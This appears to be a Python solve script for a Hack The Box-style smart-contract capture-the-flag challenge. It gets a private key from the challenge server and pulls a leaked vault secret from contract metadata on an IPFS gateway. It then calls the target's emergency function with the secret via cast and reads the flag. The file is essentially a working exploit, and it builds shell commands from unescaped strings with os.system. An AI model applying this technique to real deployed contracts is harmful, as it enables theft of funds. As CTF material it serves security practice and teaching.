#!/usr/bin/env python3
from os import system
import requests
from pwn import remote, context, args

context.log_level = "error"

if args.REMOTE:
    ip = args.HOST
    rpc_port = args.RPC_PORT
    tcp_port = args.TCP_PORT
    RPC_URL = f"http://{ip}:{int(rpc_port)}/"
    TCP_URL = f"{ip}:{int(tcp_port)}"
else:
    RPC_URL = "http://localhost:1337/"
    TCP_URL = "localhost:1338"


def csend(contract: str, fn: str, *args):
    print(
        f"cast send {contract} '{fn}' {' '.join(args)} --rpc-url {RPC_URL} --private-key {pvk}"
    )
    system(
        f"cast send {contract} '{fn}' {' '.join(args)} --rpc-url {RPC_URL} --private-key {pvk}"
    )


if __name__ == "__main__":
    connection_info = {}

    # connect to challenge handler and get connection info
    with remote(TCP_URL.split(":")[0], int(TCP_URL.split(":")[1])) as p:
        p.sendlineafter(b"action? ", b"1")
        data = p.recvall()

    lines = data.decode().split('\n')
    for line in lines:
        if line:
            key, value = line.strip().split(' :  ')
            connection_info[key] = value

    print(connection_info)
    pvk = connection_info['Private key    ']
    print(f"[*] Private key: {pvk}")
    setup = connection_info['Setup contract ']
    target = connection_info['Target contract']

    ipfs = requests.get(
        "https://gateway.pinata.cloud/ipfs/QmX9L9Q9QkM3ytQ1Wk3jKAqNDXYhK8RFQHcfq8QXyfffkN"
    ).json()
    print(f"\n[*] IPFS: {ipfs}")
    secret = ipfs['output']['devdoc']['stateVariables']['VAULT_SECRET_K256'][
        'details'].split(' ')[2]
    print(f"\n[*] Secret: {secret}")
    csend(target, "emergency(string)", secret)

    with remote(TCP_URL.split(":")[0], int(TCP_URL.split(":")[1])) as p:
        p.recvuntil(b"action? ")
        p.sendline(b"3")
        flag = p.recvall().decode()
    if "HTB" in flag:
        print(f"\n\n[*] {flag}")
